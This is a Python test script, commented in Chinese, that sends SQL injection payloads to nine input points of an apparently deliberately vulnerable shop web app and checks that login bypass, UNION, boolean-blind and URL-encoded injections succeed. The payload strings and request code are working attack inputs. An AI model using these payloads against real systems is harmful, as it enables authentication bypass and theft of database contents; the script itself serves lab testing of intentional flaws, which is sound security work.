"""02_sql_injection — SQL 注入测试（覆盖全部 9 个注入点）"""

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.test_utils import *


def run():
    print_banner("02: SQL 注入")
    reset_counters()
    s = requests.Session()

    # ── 2.1 登录绕过 ──
    info("登录绕过 (POST /login)")

    payloads_login = [
        ("万能密码 OR 1=1", "admin", "' OR '1'='1' --"),
        ("注释绕过 admin'--", "admin'--", "x"),
        ("恒真条件", "' OR 1=1 OR '", "x"),
        ("括号闭合", "') OR ('1'='1", "x"),
    ]
    for desc, username, password in payloads_login:
        r = s.post(urljoin(BASE_URL, "/login"), data={"username": username, "password": password},
                   timeout=TIMEOUT, allow_redirects=False)
        ok(f"{desc} → HTTP {r.status_code} (期望: 302)")

    # ── 2.2 API 用户查询 ──
    info("API 用户查询 (GET /api/users?name=)")

    r = s.get(urljoin(BASE_URL, "/api/users?name=admin"), timeout=TIMEOUT)
    assert_json_count(r, 1, "正常查询 admin → 1条")

    r = s.get(urljoin(BASE_URL, "/api/users?name=' OR '1'='1"), timeout=TIMEOUT)
    assert_json_count(r, 5, "注入 ' OR '1'='1 → 5条（全表）")

    r = s.get(urljoin(BASE_URL, "/api/users?name=' AND 1=1 --"), timeout=TIMEOUT)
    assert_json_count(r, 5, "布尔盲注 AND 1=1 → 5条")

    r = s.get(urljoin(BASE_URL, "/api/users?name='%20AND%201=2%20--"), timeout=TIMEOUT)
    try:
        count = len(r.json().get("data", []))
        if count == 0:
            ok(f"布尔盲注 AND 1=2 → {count}条 (期望: 0)")
        else:
            err("布尔盲注 AND 1=2 → 0条", "0", str(count))
    except Exception as e:
        err(f"布尔盲注解析失败: {e}")

    r = s.get(urljoin(BASE_URL, "/api/users?name=' UNION SELECT 1,2,3,4,5 --"), timeout=TIMEOUT)
    try:
        data = r.json().get("data", [])
        if len(data) > 5:
            ok(f"UNION注入成功 → {len(data)}条 (期望: >5)")
        else:
            err(f"UNION注入 → >5条", ">5", str(len(data)))
    except Exception as e:
        err(f"UNION注入解析失败: {e}")

    # ── 2.3 商品搜索注入 ──
    info("商品搜索注入 (GET /products?q=)")
    r = s.get(urljoin(BASE_URL, "/products?q=' OR 1=1 --"), timeout=TIMEOUT, allow_redirects=False)
    assert_body(r, "智能手机", "商品搜索恒真注入返回结果")

    # ── 2.4 商品详情注入 ──
    info("商品详情注入 (GET /products/:id)")
    r = s.get(urljoin(BASE_URL, "/products/1 OR 1=1"), timeout=TIMEOUT, allow_redirects=False)
    if r.status_code == 200 and "智能手机" in r.text:
        ok("商品详情 url注入 → 200 返回首条商品")

    # ── 2.5 注册注入 ──
    info("注册注入 (POST /register)")
    unique = f"inject_{int(time.time())}"
    r = s.post(urljoin(BASE_URL, "/register"),
               data={"username": f"{unique}", "password": "pass",
                     "email": f"{unique}@test.com' --"},
               timeout=TIMEOUT, allow_redirects=False)
    if r.status_code in (302, 200):
        ok(f"注册注入 → HTTP {r.status_code}")
    else:
        err("注册注入 HTTP", "200/302", str(r.status_code))

    # ── 2.6 评论注入 ──
    info("评论注入 (POST /products/1/comment)")
    r = s.post(urljoin(BASE_URL, "/products/1/comment"),
               data={"username": "injector", "content": "test_inject') --"},
               timeout=TIMEOUT, allow_redirects=False)
    assert_status(r, 302, "评论注入 → 302")

    # ── 2.7 留言注入 ──
    info("留言注入 (POST /contact)")
    r = s.post(urljoin(BASE_URL, "/contact"),
               data={"name": "inj", "email": "inj@test.com", "message": "test_inject') --"},
               timeout=TIMEOUT, allow_redirects=False)
    assert_status(r, 302, "留言注入 → 302")

    # ── 2.8 资料更新注入（需登录） ──
    info("资料更新注入 (POST /profile)")
    s2 = requests.Session()
    s2.post(urljoin(BASE_URL, "/login"), data={"username": "test", "password": "test123"},
            timeout=TIMEOUT, allow_redirects=True)
    r = s2.post(urljoin(BASE_URL, "/profile"),
                data={"email": "x@a.com' --", "bio": "hacked", "avatar_url": ""},
                timeout=TIMEOUT, allow_redirects=False)
    assert_body(r, "保存成功", "资料更新注入 → 含保存成功")

    # ── 2.9 API 商品查询注入 ──
    info("API 商品查询注入 (GET /api/products?category=)")
    r = s.get(urljoin(BASE_URL, "/api/products?category=手机' OR 1=1 --"), timeout=TIMEOUT)
    try:
        data = r.json().get("data", [])
        if len(data) >= 8:
            ok(f"API商品注入 → {len(data)}条 (全表)")
        elif len(data) > 0:
            ok(f"API商品注入 → {len(data)}条")
    except Exception as e:
        err(f"API商品注入解析失败: {e}")

    # ── 2.10 编码绕过 ──
    info("编码绕过")

    r1 = s.get(urljoin(BASE_URL, "/api/users?name=admin"), timeout=TIMEOUT)
    r2 = s.get(urljoin(BASE_URL, "/api/users?name=' OR '1'='1"), timeout=TIMEOUT)
    count_diff = len(r1.json().get("data", [])) != len(r2.json().get("data", []))
    if count_diff:
        ok("编码前注入有效（差异确认）")

    r3 = s.get(urljoin(BASE_URL, "/api/users?name=%27%20OR%20%271%27%3D%271"), timeout=TIMEOUT)
    try:
        if len(r3.json().get("data", [])) == len(r2.json().get("data", [])):
            ok("URL编码注入一致有效")
    except Exception:
        pass

    print_summary()
    save_results("02_sql_injection")
    return STATE["fail"]


if __name__ == "__main__":
    sys.exit(run())
